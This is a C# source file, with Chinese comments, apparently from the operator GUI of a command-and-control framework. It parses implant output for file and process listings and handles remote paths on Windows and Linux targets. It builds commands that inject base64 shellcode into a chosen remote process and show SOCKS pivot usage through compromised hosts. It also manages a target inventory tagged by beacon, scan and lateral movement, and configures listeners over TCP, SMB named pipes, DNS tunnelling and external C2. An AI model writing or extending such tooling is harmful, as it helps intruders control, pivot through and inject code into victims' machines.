using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Text.Json;
using System.Windows.Media;

namespace CsdevGui
{
    /// <summary>
    /// 操作结果信封。所有"下发命令并等待回传"的操作都返回它,
    /// 失败原因直接进 UI, 不抛异常。
    /// </summary>
    public sealed class CmdOutcome
    {
        public bool Ok;
        public string Error = "";
        public string Raw = "";
        public long TaskId;
        public int Bytes;

        public static CmdOutcome Fail(string err)
        {
            return new CmdOutcome { Ok = false, Error = err ?? "" };
        }

        public static CmdOutcome Good(string raw)
        {
            string s = raw ?? "";
            return new CmdOutcome { Ok = true, Raw = s, Bytes = Encoding.UTF8.GetByteCount(s) };
        }
    }

    /// <summary>
    /// v2 植入体原生输出的纯函数解析层。
    ///
    /// 与 UI 完全解耦 (只依赖 BCL), 因此既能被主窗口调用, 也能被
    /// <c>csdev-gui.exe --selftest</c> 在无窗口环境下逐样本自证。
    ///
    /// 依据 (只读核对, 未修改):
    ///   kits/beacon/beacon2.c cmd_ps_list   → "pid \t ppid \t threads \t name \r\n"
    ///   kits/beacon/beacon2.c cmd_fs_ops/0x03 → "d|- \t size \t name \r\n"
    /// </summary>
    public static class NativeParse
    {
        // ------------------------------------------------------------ 文件列表

        /// <summary>
        /// 解析 <c>ls</c> 输出。
        /// 容错准则: 结构化行解析成功才产出条目, 否则降级为提示行 —
        /// 任何输入都不抛异常, 也不会静默丢失植入体的报错文本。
        /// </summary>
        public static List<FsItem> FileList(string raw)
        {
            var list = new List<FsItem>();
            if (string.IsNullOrEmpty(raw)) return list;

            foreach (string line in SplitLines(raw))
            {
                if (line.Length == 0) continue;

                // 命令回显行 ("> ls /") 既不是文件条目, 也不是植入体回传的文本 —— 直接跳过。
                // 这是解析层的兜底: 等待层 (SendWaitAsync.StripCmdEcho) 已经剥过一次,
                // 但任何别的调用路径把回显喂进来时, 这里能挡住"列表里多出一条
                // 「该行是植入体回传的原始文本」假条目"再次发生。
                if (line.StartsWith("> ", StringComparison.Ordinal)) continue;

                if (!line.Contains("\t"))
                {
                    // 无 TAB: 不可能是 ls 条目 (植入体的报错/中文提示走这里)
                    list.Add(Hint(line));
                    continue;
                }

                string[] f = line.Split('\t');
                if (f.Length < 3)
                {
                    // 有 TAB 但字段不足: 原样保留, 由 UI 标为"原始"
                    list.Add(RawEntry(line, f.Length));
                    continue;
                }

                string t = f[0].Trim();
                if (t.Length != 1)
                {
                    list.Add(RawEntry(line, f.Length));
                    continue;
                }

                long size;
                if (!long.TryParse(f[1].Trim(), out size) || size < 0)
                {
                    list.Add(RawEntry(line, f.Length));
                    continue;
                }

                // 文件名含 TAB 时 f.Length > 3, 把余下片段重新拼回名字
                string name = f.Length == 3 ? f[2] : string.Join("\t", f, 2, f.Length - 2);
                if (name.Length == 0)
                {
                    list.Add(RawEntry(line, f.Length));
                    continue;
                }

                char tc = char.ToLowerInvariant(t[0]);
                var item = new FsItem();
                item.Name = name;
                item.Size = size;
                item.IsDir = tc == 'd';
                item.Kind = item.IsDir ? "目录" : "文件";
                if (tc != 'd' && tc != '-') item.Kind = t;   // 未知类型: 保留原字符, UI 显示为"原始"
                list.Add(item);
            }

            SortFs(list);
            return list;
        }

        /// <summary>目录在前, 然后按名称不区分大小写排序。</summary>
        public static void SortFs(List<FsItem> list)
        {
            if (list == null) return;
            list.Sort(delegate(FsItem a, FsItem b)
            {
                if (a.IsDir != b.IsDir) return a.IsDir ? -1 : 1;
                return string.Compare(a.Name, b.Name, StringComparison.OrdinalIgnoreCase);
            });
        }

        private static FsItem Hint(string line)
        {
            var it = new FsItem();
            it.Raw = true;
            it.IsDir = false;
            it.Size = -1;
            it.Name = line;
            it.Kind = "提示";
            return it;
        }

        private static FsItem RawEntry(string line, int fields)
        {
            var it = Hint(line);
            it.Kind = "原始";
            it.Name = line;
            return it;
        }

        // ------------------------------------------------------------ 进程列表

        /// <summary>
        /// 解析 <c>ps</c> 输出 (植入体原生四字段)。
        /// 字段数不符 / 非数字 / 空行都只影响该行, 不影响整块结果。
        /// </summary>
        public static List<ProcItem> ProcList(string raw)
        {
            var list = new List<ProcItem>();
            if (string.IsNullOrEmpty(raw)) return list;

            foreach (string line in SplitLines(raw))
            {
                if (line.Length == 0) continue;
                if (!line.Contains("\t"))
                {
                    list.Add(ProcHint(line));
                    continue;
                }

                string[] f = line.Split('\t');
                if (f.Length < 4)
                {
                    list.Add(ProcHint(line));
                    continue;
                }

                long pid, ppid, threads;
                if (!long.TryParse(f[0].Trim(), out pid) || pid <= 0 ||
                    !long.TryParse(f[1].Trim(), out ppid) || ppid < 0 ||
                    !long.TryParse(f[2].Trim(), out threads) || threads < 0)
                {
                    list.Add(ProcHint(line));
                    continue;
                }

                // 进程名含 TAB 的极端情况: 余下片段拼回
                string name = f.Length == 4 ? f[3] : string.Join("\t", f, 3, f.Length - 3);
                if (name.Length == 0)
                {
                    list.Add(ProcHint(line));
                    continue;
                }

                var it = new ProcItem();
                it.Pid = pid;
                it.Ppid = ppid;
                it.Threads = threads;
                it.Name = name;
                list.Add(it);
            }
            return list;
        }

        private static ProcItem ProcHint(string line)
        {
            var it = new ProcItem();
            it.Raw = true;
            it.Pid = -1;
            it.Name = line;
            it.Hint = "提示";
            return it;
        }

        // ------------------------------------------------------------ 行拆分

        /// <summary>
        /// 按 CRLF / CR / LF 拆行。不用 Split('\n') 是因为单独一个 \r
        /// 也会被植入体当成行尾, 而 .NET 的 ReadLine 语义是 \r 也算行尾。
        /// </summary>
        public static List<string> SplitLines(string raw)
        {
            var outLines = new List<string>();
            if (string.IsNullOrEmpty(raw)) return outLines;

            int n = raw.Length, start = 0;
            for (int i = 0; i < n; i++)
            {
                char c = raw[i];
                if (c == '\n')
                {
                    outLines.Add(TrimCr(raw, start, i - start));
                    start = i + 1;
                }
                else if (c == '\r')
                {
                    outLines.Add(TrimCr(raw, start, i - start));
                    if (i + 1 < n && raw[i + 1] == '\n') i++;
                    start = i + 1;
                }
            }
            if (start < n) outLines.Add(TrimCr(raw, start, n - start));
            return outLines;
        }

        private static string TrimCr(string s, int start, int len)
        {
            if (len <= 0) return "";
            return s.Substring(start, len);
        }

        // ------------------------------------------------------------ 路径

        /// <summary>
        /// 远端路径拼接/规范化。植入体不做规范化 (FindFirstFileA 原样吃),
        /// 所以客户端必须处理 <c>/ \ .. .</c> 混用与末尾分隔符。
        /// 保留 UNC 前缀与盘符, 不改变大小写。
        /// </summary>
        public static string JoinRemote(string cwd, string name) { return JoinRemote(cwd, name, false); }

        public static string JoinRemote(string cwd, string name, bool posix)
        {
            string c = (cwd ?? "").Trim();
            string n = (name ?? "").Trim();
            if (n.Length == 0) return NormRemote(c, posix);
            if (IsAbsoluteRemote(n, posix)) return NormRemote(n, posix);
            if (c.Length == 0) return NormRemote(n, posix);

            if (posix)
            {
                if (c == "/") return NormRemote("/" + n, true);
                return NormRemote(c.TrimEnd('/') + "/" + n, true);
            }

            // 根相对路径 (\Temp): 相对当前盘符根, 不是相对当前目录。
            // 若已知父路径的根, 直接拼到根上; 否则保持根相对形态。
            if (n.Length > 0 && (n[0] == '\\' || n[0] == '/'))
            {
                string root = RootOf(c);
                if (root.Length > 0) return NormRemote(root + n);
                return NormRemote(n);
            }

            string sep = (c[0] == '/') ? "/" : "\\";
            return NormRemote(c.TrimEnd('\\', '/') + sep + n);
        }

        /// <summary>取路径的根 (C:\ 或 \\server\share); POSIX 下恒为 "/"。没有根则返回空。</summary>
        public static string RootOf(string p) { return RootOf(p, false); }

        public static string RootOf(string p, bool posix)
        {
            string s = NormRemote(p, posix);
            if (s.Length == 0) return "";
            if (posix) return s[0] == '/' ? "/" : "";
            string prefix;
            string rest = SplitRemotePrefix(s, out prefix);
            if (prefix.Length > 0) return prefix;
            return "";
        }

        /// <summary>取父目录; 已到根则返回根自身 (POSIX 下是 "/", Windows 下是 "C:\")。</summary>
        public static string ParentRemote(string p) { return ParentRemote(p, false); }

        public static string ParentRemote(string p, bool posix)
        {
            if (posix)
            {
                string sp = NormRemote(p, true);
                if (sp.Length == 0 || sp == "/") return "/";
                int c0 = sp.LastIndexOf('/');
                return c0 <= 0 ? "/" : sp.Substring(0, c0);
            }

            string s = NormRemote(p);
            if (s.Length == 0) return "C:\\";

            string prefix;
            string rest = SplitRemotePrefix(s, out prefix);
            if (rest.Length == 0) return prefix.Length > 0 ? prefix : "C:\\";

            int cut = rest.LastIndexOfAny(new char[] { '\\', '/' });
            if (cut < 0) return prefix;
            string head = rest.Substring(0, cut);
            if (head.Length == 0) return prefix;
            return prefix + head;
        }

        /// <summary>
        /// 是否为"自足"路径 (与当前目录无关)。
        /// Windows: 盘符路径或 UNC 共享路径。注意单分隔符开头 (<c>\Temp</c>) <b>不算</b>
        /// 绝对路径 —— 它相对当前盘符根, 由 JoinRemote 拼到 <c>C:\</c> 上。
        /// POSIX: 以 <c>/</c> 开头即为绝对, 没有"根相对"这个概念。
        /// </summary>
        public static bool IsAbsoluteRemote(string p) { return IsAbsoluteRemote(p, false); }

        public static bool IsAbsoluteRemote(string p, bool posix)
        {
            if (string.IsNullOrEmpty(p)) return false;
            p = p.Trim();
            if (posix) return p.Length > 0 && p[0] == '/';
            if (p.Length >= 2 && p[1] == ':' &&
                char.IsLetter(p[0])) return true;                    // C:\ 或 C:/
            if (p.StartsWith("\\\\") || p.StartsWith("//")) return true;  // UNC
            return false;
        }

        /// <summary>根相对路径: 以单个分隔符开头 (相对当前盘符根)。POSIX 下不存在, 恒为 false。</summary>
        public static bool IsRootRelative(string p) { return IsRootRelative(p, false); }

        public static bool IsRootRelative(string p, bool posix)
        {
            if (string.IsNullOrEmpty(p)) return false;
            if (posix) return false;      // POSIX 下 "/x" 就是绝对路径, 没有根相对形态
            p = p.Trim();
            if (p.Length == 0) return false;
            if (p[0] != '\\' && p[0] != '/') return false;
            return IsAbsoluteRemote(p) == false;
        }

        /// <summary>
        /// 压掉重复分隔符与 <c>.</c> / <c>..</c> 段。
        /// <paramref name="posix"/> 为 true 时按 POSIX 语义 (分隔符 <c>/</c>, 根是 <c>/</c>);
        /// 否则按 Windows 语义 (分隔符 <c>\</c>, 保留盘符与 UNC 前缀)。
        ///
        /// **为什么必须有这个开关**: 以前只有 Windows 一套逻辑, 会把 Linux 会话的
        /// <c>/etc</c> 规范化成 <c>\etc</c> 再发给植入体 —— 目标机上不存在这个路径,
        /// 报"无法枚举目录"。现象就是"文件浏览读不了 Linux, <c>/</c> 会变成 <c>\</c>"。
        /// 注意 POSIX 下**不替换反斜杠**: 那也是 Linux 的合法文件名字符, 换成 <c>/</c>
        /// 反而会破坏路径; 只有分隔符的选择不同。
        /// </summary>
        public static string NormRemote(string path) { return NormRemote(path, false); }

        public static string NormRemote(string path, bool posix)
        {
            string s = (path ?? "").Trim();
            if (s.Length == 0) return "";
            if (posix) return NormPosix(s);

            s = s.Replace('/', '\\');
            string prefix;
            string rest = SplitRemotePrefix(s, out prefix);
            bool rooted = prefix.Length > 0 || s[0] == '\\';

            var stack = new List<string>();
            foreach (string rawPart in rest.Split('\\'))
            {
                string part = rawPart;
                if (part.Length == 0) continue;
                if (part == ".") continue;
                if (part == "..")
                {
                    // 不能越过根: 有根前缀时直接丢掉; 纯相对路径则保留, 交给目标机解释
                    if (stack.Count > 0 && stack[stack.Count - 1] != "..") stack.RemoveAt(stack.Count - 1);
                    else if (!rooted) stack.Add("..");
                    continue;
                }
                stack.Add(part);
            }

            string body = string.Join("\\", stack.ToArray());
            if (rooted)
            {
                string pfx = prefix.Length > 0 ? prefix : "\\";
                return pfx + body;      // 根目录保持 "C:\" 形态, 便于后续直接拼接
            }
            return body;
        }

        /// <summary>POSIX 路径规范化: 压掉重复 <c>/</c> 与 <c>.</c> / <c>..</c> 段。根固定为 <c>/</c>。</summary>
        private static string NormPosix(string s)
        {
            bool rooted = s[0] == '/';
            var stack = new List<string>();
            foreach (string rawPart in s.Split('/'))
            {
                string part = rawPart;
                if (part.Length == 0) continue;
                if (part == ".") continue;
                if (part == "..")
                {
                    if (stack.Count > 0 && stack[stack.Count - 1] != "..") stack.RemoveAt(stack.Count - 1);
                    else if (!rooted) stack.Add("..");
                    continue;
                }
                stack.Add(part);
            }
            string body = string.Join("/", stack.ToArray());
            if (rooted) return body.Length == 0 ? "/" : "/" + body;
            return body;
        }

        /// <summary>取根前缀 (盘符前缀或 UNC 共享名) 并返回其后的相对部分。</summary>
        private static string SplitRemotePrefix(string s, out string prefix)
        {
            prefix = "";
            string rest = s;

            if (s.StartsWith("\\\\"))
            {
                rest = s.Substring(2);
                int cut = rest.IndexOf('\\');
                if (cut < 0)
                {
                    prefix = "\\\\" + rest;
                    return "";
                }
                // 前缀必须带尾部分隔符: 否则 "\\srv\share\a" 会退化成 "\\srvshare\a"
                prefix = "\\\\" + rest.Substring(0, cut) + "\\";
                rest = rest.Substring(cut + 1);
                return rest.TrimStart('\\', '/');
            }

            if (s.Length >= 2 && s[1] == ':' && char.IsLetter(s[0]))
            {
                // 盘符根前缀自带分隔符: 否则 "C:\a\b" 会被还原成 "C:a\b"
                prefix = s.Substring(0, 1).ToUpperInvariant() + ":\\";
                rest = s.Substring(2);
                return rest.TrimStart('\\', '/');
            }

            return rest.TrimStart('\\', '/');
        }

        // ------------------------------------------------------------ 命令构造

        /// <summary>
        /// 进程结束命令。
        ///
        /// <b>重要偏差</b>: 服务端 v2Route 把 <c>kill</c> 判给了 CMD_EXIT
        /// (go/v2_core.go: <c>case "exit", "kill": return cmdExit</c>), 即
        /// "kill 任意参数" 都会让植入体退出 —— 语义是结束会话, 不是结束进程。
        /// 因此 v2 会话改用 shell 通道的 taskkill (服务端别名表里本就有
        /// <c>kill → taskkill /F /PID</c> 的映射, 这里显式写全, 跳过歧义)。
        /// 该服务端文件由其它子代理维护, 此侧只做适配, 不修改 go/。
        /// </summary>
        public static string KillProcCmd(bool isV2, long pid)
        {
            if (isV2) return "taskkill /F /PID " + pid;
            return "kill " + pid;   // v1: 服务端别名映射 → taskkill /F /PID
        }

        /// <summary>注入命令。先修剪 base64 (换行/空格/URL 安全字符), 再拼单行。</summary>
        public static string InjectCmd(long pid, string b64, out string error)
        {
            error = "";
            string s = (b64 ?? "").Trim();
            if (s.Length == 0) { error = "shellcode base64 为空"; return ""; }

            var sb = new StringBuilder(s.Length);
            foreach (char ch in s)
            {
                if (char.IsWhiteSpace(ch)) continue;
                if (ch == '-' || ch == '_') { error = "base64 含 URL 安全字符 (- _), 服务端只接受标准 base64"; return ""; }
                if (ch == '=') continue;                      // 尾部填充由服务端 DecodeString 处理
                bool ok = (ch >= 'A' && ch <= 'Z') || (ch >= 'a' && ch <= 'z')
                          || (ch >= '0' && ch <= '9') || ch == '+' || ch == '/';
                if (!ok) { error = "base64 含非法字符: " + ch; return ""; }
                sb.Append(ch);
            }
            if (sb.Length == 0) { error = "shellcode base64 为空"; return ""; }

            return "inject " + pid + " " + sb.ToString();
        }
    }

    /// <summary>
    /// 目标库与代理枢轴的纯函数解析/格式化层。
    ///
    /// 与 UI 完全解耦 (只依赖 BCL 与冻结画刷), 因此
    /// <c>csdev-gui.exe --selftest</c> 能在无窗口环境下逐样本断言:
    /// source 标签拆分、着色、模糊过滤、空值降级、usage 拼接。
    ///
    /// 依据 (只读核对, 未修改 go/):
    ///   go/targets.go Target 结构        → kind,id,host,ip,os,note,source,sid,ts
    ///   go/targets.go handleTargetsCSV   → "curl 无", CSV 表头 host,ip,os,source,sid,note,ts
    ///   go/proxy.go handleProxyStart     → usage = "curl --socks5-hostname 127.0.0.1:PORT http://TARGET/"
    ///   go/proxy.go proxyRunKey          → 运行键 "sid:port"
    /// </summary>
    public static class TargetParse
    {
        /// <summary>
        /// 拆分 source 字段: 逗号分隔, 去首尾空白, 按名称去重 (保序, 不区分大小写),
        /// 未知来源原样保留 (由着色层降级为默认色)。空输入返回空表。
        /// </summary>
        public static List<string> Sources(string source)
        {
            var list = new List<string>();
            if (string.IsNullOrEmpty(source)) return list;

            foreach (string raw in source.Split(','))
            {
                string s = raw.Trim();
                if (s.Length == 0) continue;
                bool dup = false;
                for (int i = 0; i < list.Count; i++)
                {
                    if (string.Equals(list[i], s, StringComparison.OrdinalIgnoreCase)) { dup = true; break; }
                }
                if (!dup) list.Add(s);
            }
            return list;
        }

        /// <summary>source 原文 -&gt; 彩色标签集合。</summary>
        public static List<SourceTag> Tags(string source)
        {
            var tags = new List<SourceTag>();
            foreach (string s in Sources(source)) tags.Add(SourceTag.Make(s));
            return tags;
        }

        /// <summary>来源着色: beacon=蓝 scan=灰 lateral=橙 manual=绿 其它=紫。</summary>
        public static Brush SourceBrush(string tag)
        {
            switch ((tag ?? "").Trim().ToLowerInvariant())
            {
                case "beacon": return Palette.Accent;
                case "scan": return Palette.Dim;
                case "lateral": return Palette.Warn;
                case "manual": return Palette.Ok;
                default: return Palette.Purple;
            }
        }

        /// <summary>
        /// 纯客户端模糊过滤: 命中 host / ip / note 任一字段即可 (不区分大小写)。
        /// 空查询恒为真。
        /// </summary>
        public static bool Match(string host, string ip, string note, string query)
        {
            string q = (query ?? "").Trim();
            if (q.Length == 0) return true;
            if (Contains(host, q)) return true;
            if (Contains(ip, q)) return true;
            return Contains(note, q);
        }

        private static bool Contains(string hay, string q)
        {
            if (string.IsNullOrEmpty(hay)) return false;
            return hay.IndexOf(q, StringComparison.OrdinalIgnoreCase) >= 0;
        }

        /// <summary>空值降级: 空串 / null 一律落到占位符。</summary>
        public static string Or(string v, string fallback)
        {
            return string.IsNullOrEmpty(v) ? (fallback ?? "") : v;
        }

        /// <summary>
        /// SOCKS 用法提示: 优先用服务端返回的 usage, 缺省时按服务端同格式本地拼一份
        /// (方便对历史条目/离线查看)。端口非法时返回空串。
        /// </summary>
        public static string UsageText(string fromServer, long port)
        {
            if (!string.IsNullOrEmpty(fromServer)) return fromServer;
            if (port <= 0 || port > 65535) return "";
            return "curl --socks5-hostname 127.0.0.1:" + port + " http://TARGET/";
        }

        /// <summary>运行键, 与服务端 proxyRunKey 同构 (sid:port)。</summary>
        public static string RunKey(string sid, long port)
        {
            return (sid ?? "") + ":" + port;
        }

        /// <summary>反向转发条目描述 (右键/提示复用)。</summary>
        public static string RportText(string sid, long port, string target)
        {
            return (sid ?? "") + " :" + port + "  ->  " + Or(target, "(未指定)");
        }
    }

    /// <summary>
    /// /api/state.proxy 的解析结果。字段缺失 / 整块缺失都只产出空集合与零值,
    /// 由 StatsText() 如实标注, 不做任何假设。
    /// </summary>
    public sealed class ProxyView
    {
        public readonly List<SocksRow> Socks = new List<SocksRow>();
        public readonly List<RportRow> Rports = new List<RportRow>();

        /// <summary>服务端是否返回了 proxy 块 (false = 旧版服务端, 页面显示空表)。</summary>
        public bool Present;

        public long Chans;          // 活跃通道总数
        public long TxTlv;          // 已下发植入体的数据 TLV 总数
        public long UpBytes;        // 上行 (服务端 -> 植入体) 字节
        public long RxBytes;        // 从本地客户端读入的字节
        public long DownBytes;      // 下行 (植入体 -> 客户端) 字节
        public string Pump = "";    // 泵状态 (proxy.go 固定回 "running")

        public string StatsText()
        {
            if (!Present) return "服务端未返回 proxy 块 (GET /api/state.proxy) — 代理页显示空表";
            var sb = new StringBuilder();
            sb.Append("总通道数 ").Append(Chans)
              .Append("    上行 (→植入体) ").Append(Fmt.Size(UpBytes))
              .Append("    下行 (→客户端) ").Append(Fmt.Size(DownBytes))
              .Append("    下行 TLV 数 ").Append(TxTlv)
              .Append("    客户端读入 ").Append(Fmt.Size(RxBytes));
            if (Pump.Length > 0) sb.Append("    pump ").Append(Pump);
            return sb.ToString();
        }
    }

    /// <summary>
    /// /api/state 里 targets / proxy 两块的构造层。
    /// 全部取值走 J 的安全访问器: 字段缺失、类型不符、整块缺失都不抛异常,
    /// 最差情况只是空表 (任务硬要求: 页面显示空表而不是崩)。
    /// </summary>
    public static class StateParse
    {
        /// <summary>构造目标库行集合。kind 字段服务端恒为 "target", 这里不校验 (只作展示)。</summary>
        public static List<TargetRow> Targets(JsonElement root)
        {
            var list = new List<TargetRow>();
            foreach (var e in root.Arr("targets"))
            {
                var r = new TargetRow();
                r.Kind = e.Str("kind");
                r.Id = e.Long("id");
                r.Host = e.Str("host");
                r.Ip = e.Str("ip");
                r.Os = e.Str("os");
                r.Source = e.Str("source");
                r.Sid = e.Str("sid");
                r.Note = e.Str("note");
                r.Ts = e.Long("ts");

                // 既无 id 又无 host 的行无法作为操作目标, 直接丢弃 (不会出现在正常响应里)
                if (r.Id <= 0 && r.Host.Length == 0) continue;
                list.Add(r);
            }
            return list;
        }

        /// <summary>构造代理枢轴视图 (SOCKS 入口 + rportfwd + 统计)。</summary>
        public static ProxyView Proxy(JsonElement root)
        {
            var v = new ProxyView();
            var p = root.Field("proxy");
            if (p.ValueKind != JsonValueKind.Object) return v;
            v.Present = true;

            foreach (var e in p.Arr("socks"))
            {
                var r = new SocksRow();
                r.Sid = e.Str("sid");
                r.Port = e.Long("port");
                r.Listen = e.Str("listen");
                r.Chans = e.Long("chans");
                r.TxTlv = e.Long("tx_tlv");
                r.RxB = e.Long("rx_b");
                r.UpB = e.Long("up_b");
                // listen 缺失时按服务端语义补默认值 (proxy.go 恒为 127.0.0.1:port)
                if (r.Listen.Length == 0 && r.Port > 0) r.Listen = "127.0.0.1:" + r.Port;
                if (r.Sid.Length == 0 && r.Port <= 0) continue;
                v.Socks.Add(r);
            }

            foreach (var e in p.Arr("rportfwd"))
            {
                var r = new RportRow();
                r.Sid = e.Str("sid");
                r.Port = e.Long("port");
                r.Target = e.Str("target");
                if (r.Sid.Length == 0 && r.Port <= 0) continue;
                v.Rports.Add(r);
            }

            v.Chans = p.Long("chans");
            v.TxTlv = p.Long("tx_tlv");
            v.UpBytes = p.Long("up_bytes");
            v.RxBytes = p.Long("rx_bytes");
            v.DownBytes = p.Long("down_bytes");
            v.Pump = p.Str("pump");
            return v;
        }
    }

    // ---------------------------------------------------------------- 监听器增删

    /// <summary>
    /// 监听器运行时增删的解析层 (纯函数, 无 UI 依赖 —— --selftest 直接断言)。
    ///
    /// 服务端契约:
    ///   POST /api/listener/add    {kind, addr} -> {ok, id, kind, addr} 或 {ok:false, error}
    ///   POST /api/listener/remove {id}         -> {ok:true} 或 {ok:false, error}
    ///   GET  /api/listeners                    -> listeners[] (字段可能被追加, 兼容解析)
    ///
    /// 两条硬规则:
    ///   1) **主 HTTP listener 不可删** (服务端会回错)。GUI 侧先把它的按钮置灰并给出理由,
    ///      但服务端真回错时**原样显示**, 不替换成自己的笼统文案。
    ///   2) 服务端回的 error 一律**原样透出** (例如端口占用), 不静默、不改写。
    /// </summary>
    public static class ListenerParse
    {
        /// <summary>kind 下拉的固定顺序 (与服务端约定的一致)。</summary>
        public static readonly string[] Kinds = { "http", "https", "tcp", "smb", "dns", "extc2" };

        private static readonly string[] AddressExamples =
        {
            "0.0.0.0:8443",                 // http
            "0.0.0.0:8443",                 // https
            "0.0.0.0:8444",                 // tcp
            "\\\\.\\pipe\\csdev_pipe",      // smb
            "0.0.0.0:5353",                 // dns
            "0.0.0.0:9100",                 // extc2
        };

        /// <summary>
        /// kind -> 新建对话框下拉里的显示名。HTTP/HTTPS **保留**在下拉里并标注"运行期不支持":
        /// 它们不是从列表里消失, 而是点确定后由服务端明确拒绝, 那句原因原样回给操作员。
        /// </summary>
        public static readonly string[] KindLabels =
        {
            "HTTP（运行期不支持）",
            "HTTPS（运行期不支持）",
            "TCP（反向连接）",
            "SMB（命名管道）",
            "DNS（UDP 隧道）",
            "External C2（第三方中转）",
        };

        /// <summary>
        /// HTTP(S) 被服务端拒绝的理由模板 (go/listener_admin.go 的 listenerAdd 原文,
        /// 只把 kind 位置留成 {k}): 运行期新增 HTTP 口接不到启动期固化的控制台 mux。
        /// 界面上先展示, 提交后服务端回的同一句话再原样进状态栏。
        /// </summary>
        public const string RejectTemplate =
            "运行期不支持新增 {k} listener: 控制台 mux/TLS 在启动期已固化, "
          + "新 HTTP 口无法共享路由表。HTTP(S) 承载请用启动参数 --port / -tls";

        /// <summary>运行期能否新增该 kind (只有 tcp/smb/dns/extc2 可以; HTTP/HTTPS 与未知类型一律否)。</summary>
        public static bool KindSupported(string kind)
        {
            string k = NormalizeKind(kind);
            return k == "tcp" || k == "smb" || k == "dns" || k == "extc2";
        }

        public static string NormalizeKind(string kind)
        {
            return (kind ?? "").Trim().ToLowerInvariant();
        }

        /// <summary>kind -> 下拉显示名。未知 kind 原样返回 (不编造标签)。</summary>
        public static string KindLabel(string kind)
        {
            string k = NormalizeKind(kind);
            int i = Array.IndexOf(Kinds, k);
            return i < 0 ? (kind ?? "") : KindLabels[i];
        }

        /// <summary>新建对话框下拉的选项集 (kind + 显示名 + 是否运行期支持)。</summary>
        public static List<KindOption> Options()
        {
            var list = new List<KindOption>();
            for (int i = 0; i < Kinds.Length; i++)
                list.Add(new KindOption
                {
                    Kind = Kinds[i],
                    Label = KindLabels[i],
                    Supported = KindSupported(Kinds[i]),
                });
            return list;
        }

        /// <summary>
        /// kind -> 对话框里的说明文字 (选中类型时显示; 含地址示例与配套载荷)。
        /// 与仓库实测结论一致: win2-tcp 只能投 TCP listener, 其余 win2-* 是 HTTP 承载。
        /// </summary>
        public static string KindNote(string kind)
        {
            string k = NormalizeKind(kind);
            string ex = AddressExample(k);
            switch (k)
            {
                case "http":
                case "https":
                    return "服务端原话: " + RejectTemplate.Replace("{k}", k)
                         + "\n仍可点『确定』下发: 服务端会把这句话原样回给你 (GUI 不替它改写)。";
                case "tcp":
                    return "服务端在 addr 上起 TCP reverse listener, 与载荷 win2-tcp 配套 —— "
                         + "其它 win2-* 是 HTTP 承载, 投到 TCP listener 上会「连上就沉默」。\n地址示例: " + ex;
                case "smb":
                    return "Windows 命名管道 listener: addr 是管道名 (不是 host:port)。\n地址示例: " + ex;
                case "dns":
                    return "UDP DNS listener: 端口 53 需要特权, 建议先用高位端口验证链路。\n地址示例: " + ex;
                case "extc2":
                    return "External C2 接入点: 供第三方中转按 external C2 规范接入。\n地址示例: " + ex;
                default:
                    return "未知监听器类型, 无法给出地址示例";
            }
        }

        /// <summary>对话框里 HTTP(S) 那一行的告警色 (不支持的类型标黄, 让操作员先看到)。</summary>
        public static bool KindNeedsWarn(string kind) { return !KindSupported(kind); }

        /// <summary>kind -> 地址示例。未知 kind 回空串 (不编造)。</summary>
        public static string AddressExample(string kind)
        {
            int i = Array.IndexOf(Kinds, NormalizeKind(kind));
            return i < 0 ? "" : AddressExamples[i];
        }

        /// <summary>地址输入框的占位提示文本 (kind 变化时刷新)。</summary>
        public static string AddressHint(string kind)
        {
            string k = NormalizeKind(kind);
            string ex = AddressExample(k);
            if (ex.Length == 0) return "地址: 未知监听器类型, 无法给出示例";
            return "地址示例 (" + k + "): " + ex;
        }

        /// <summary>地址为空时在**本地**拦下, 不占用服务端往返 (空串 = 通过)。</summary>
        public static string AddressProblem(string addr)
        {
            if ((addr ?? "").Trim().Length == 0)
                return "请先填写监听地址 (示例见地址框下方提示)";
            return "";
        }

        // ------------------------------------------------------------ 行判定

        /// <summary>
        /// 服务端 protected/manageable 字段的解析结果 (三态)。
        /// 未知只表示"服务端没给这个字段", 不是"可以删" —— 回落到启发式判据。
        /// </summary>
        public const int ManageUnknown = 0;
        public const int ManageYes = 1;
        public const int ManageNo = 2;

        /// <summary>
        /// 解析服务端追加的保护字段。
        ///
        /// 服务端 listener_admin.go 的 listenerList() 会给每一行追加
        /// protected / manageable 两个布尔字段 (protected = 控制台入口, 不可删)。
        /// 字段缺失 (旧二进制) 回 ManageUnknown; 类型不符也回 ManageUnknown,
        /// 绝不把"没给"当成"允许删"。
        /// </summary>
        public static int ManageFlag(JsonElement el)
        {
            var m = el.Field("manageable");
            if (m.ValueKind == JsonValueKind.True) return ManageYes;
            if (m.ValueKind == JsonValueKind.False) return ManageNo;
            var p = el.Field("protected");
            if (p.ValueKind == JsonValueKind.True) return ManageNo;
            if (p.ValueKind == JsonValueKind.False) return ManageYes;
            return ManageUnknown;
        }

        /// <summary>
        /// 该行能不能移除。
        ///
        /// 判定顺序: **服务端说了算** (manageable / protected 字段) → 字段缺失时才用
        /// 本地启发式 (uri 非空 = 启动期注册的入口; name 前缀 csdev-)。
        /// 本地启发式必然偏保守: 服务端给新增 listener 起的名字就是 csdev-tcp-8444,
        /// 光看名字会把可删的行也判成不可删 —— 所以服务端字段在场时以它为准。
        /// 反向的安全阀: 只要没有 id, 一律不可删 (按钮置灰), 不拿 name 冒充 id 去撞服务端。
        /// </summary>
        public static bool CanManage(int manageFlag, string name, string proto, string uri, string id)
        {
            if ((id ?? "").Trim().Length == 0) return false;
            if (manageFlag == ManageNo) return false;
            if (manageFlag == ManageYes) return true;
            return !IsBuiltinRow(name, proto, uri);
        }

        /// <summary>
        /// 该行是不是进程启动时就存在的主 listener (服务端字段缺失时的启发式判据)。
        ///
        /// 判据是 <c>uri</c> 非空: 服务端 server.go 注册的 csdev-v2 (/submit) 与
        /// csdev-legacy (/report) 都带 uri, profile URI 池入口也是启动期固定的;
        /// 运行时新增的 listener 不带 uri。为兼容服务端以后给新增行也补 uri 的情况,
        /// 再看一层 name/proto 特征。
        /// 字段缺失时**判为不可删** —— 宁可不给可点的按钮, 也不要按下去撞服务端错误。
        /// </summary>
        public static bool IsBuiltinRow(string name, string proto, string uri)
        {
            if ((uri ?? "").Trim().Length > 0) return true;
            string p = (proto ?? "").Trim();
            if (p.Length == 0) return true;                      // 连 proto 都没给, 无法判定 -> 保守
            string n = (name ?? "").Trim();
            return n.StartsWith("csdev-", StringComparison.OrdinalIgnoreCase);
        }

        public static bool IsBuiltinRow(JsonElement el)
        {
            return IsBuiltinRow(el.Str("name"), el.Str("proto"), el.Str("uri"));
        }

